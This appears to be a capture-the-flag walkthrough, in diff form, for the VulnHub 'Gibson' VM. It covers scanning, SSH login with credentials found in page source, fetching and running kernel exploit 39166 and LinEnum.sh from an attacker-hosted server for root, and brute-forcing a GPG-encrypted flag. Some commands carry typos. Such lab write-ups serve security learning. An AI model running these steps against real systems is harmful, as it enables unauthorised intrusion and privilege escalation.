@@ -1,0 +1,92 @@
+
+Hack the Gibson VM (CTF Challenge)
+
+It’s a boot2root challenge and it does not get over with getting root access. You have to find flag also. So let’s start.
+First of all download lab from https://download.vulnhub.com/gibson/gibson.ova
+Now open kali terminal and like always start with first step i.e. netdiscover
+netdiscover
+it shows all the hosts those are up in our network and from here we get our target ip.
+Target IP: 192.168.1.6
+
+As our target is all set we are going to scan it with nmap which will show all the open ports. In this case open ports are only two i.e. 22 and 80.
+nmap –p- -A 192.168.1.6
+
+As from the above result we have got 80 port open so we will open target ip in browser. It shows an accessible directory. Let’s try opening it as we cannot see anything important here.
+
+Oh no such luck with this also. It’s written the result will be found by brute force but there is no place where we can apply brute force.
+
+As we do not have any other option so let’s just go to view page source to see if we could get any clue to move further in our task. Right click on page and choose view page source. Great, we have password god for margo
+
+Now from our nmap result we have got port 22 open which is for ssh login. So open it in kali terminal
+sshmargo@192.168.1.6
+And password is god which we got from last result. Good we have access of our lab now.
+
+Our next step is to find the kernel version of lab and for that type
+lsb_release–a
+it gives that Ubuntu 14.04 is used and to get the root access of  lab, we will use the particular exploit made for this kernel version i.e. 39166. So first download it and then compile by command
+gcc 39166 –o 39166
+after compiling copy it to var/www/html now run the commands given below to get root access
+cd /tmp
+wgethttp://192.168.1.7/39166
+chmod 777 39166
+./39166
+As we have root access, finally first challenge is completed. Now it’s time to find the flag.
+
+Now we are in root so we will download LinEnum.sh zip file to get the better access of Linux and privilege escalation. After unzipping it, move in to folder and just copy LinEnum.sh file to var/www/html. Perform the following commands with ip of kali linux
+wgethttp://192.268.1.7/LinEnum.sh
+chmod 777 LinEnum.sh
+./LinEnum.sh
+
+It shows all the services running.
+
+Here we get some interesting file which is highlighted in below image. It shows some external server is running.
+
+Now from the process list we see something like ftpserv so we can just search based on that.
+Find / -name ftpserv*
+Awesome it gives us aftpserv.img file which can prove to be a useful thing.
+
+Now I copied this ftpserv.img file for easy downloading.
+Cp /var/lib/libvirt/images/ftpserv.img /var/www/html
+Chmod 777  /var/www/hmtl/ftpserv.img
+
+Here I downloaded that ftpserv.img file in my kali linux.
+wget http://192.168.1.6/ftpserv.img
+
+This time I have checked the file type of downloaded file and then extracted it
+fileftpserv.img
+losetup /dev/loop0 /root/ftvserv.img -0 $((63*512))
+
+It extracted the ftpserv.img  and it has some files inside it. When I opened garbage folder there I saw a flag.img file which is what we need i.e. flag.
+
+Open garbage folder in terminal and make directory flag for extracting flag.img in it.
+mkdir flag
+mount –t ext2 flag.img flag
+now I open flag folder and here I could see all extracted data of flag.img even hidden files also.
+cd flag
+ls –la
+from the list of files I open .trash folder
+cd .trash
+ls –la
+and here we can see that finally we got our flag but it’s in other file type so let’s check it
+file flag.txt.gpg
+this shows that task is not completed yet and we still have encrypted flag.
+
+Though we have our flag but we do not have key for decryption. So looking around it I found a hint.txt file of flag which probably could have key to open it. So let’s open it
+cat hint.txt
+Here we can see that it gives 2 links.
+
+Now we open the above links in Firefox browser. And we get 2 movies which has only one thing in common i.e. actor jonny lee miller.
+
+
+After doing Google search about these movies and jonny lee miler I came to know that in hacker’s movie he has aliases like zerocool, crash over ride etc. so by using cup software I created a dictionary. By running following command in .trash folder. Simultaneously it’s decrypting our encrypted flag also.
+for x in $( cat /root/Desktop/cup/zerocool.txt) ; do
+>echo [x] trying $x
+>gpg –output flag.txt –passphrase $x –decrypt flag.txt.gpg
+>done
+At the bottom it gives that flag.txt exists.
+
+Now again running ls command it reflects off flag.txt file which is basically our flag. So at last type the given command.
+cat flag.txt
+Fantastic, after all the difficulties we successfully got our flag.
+
+Author: Shailesh Kumar is a passionate Researcher and Technical Writer at Hacking Articles. he is a hacking enthusiast.
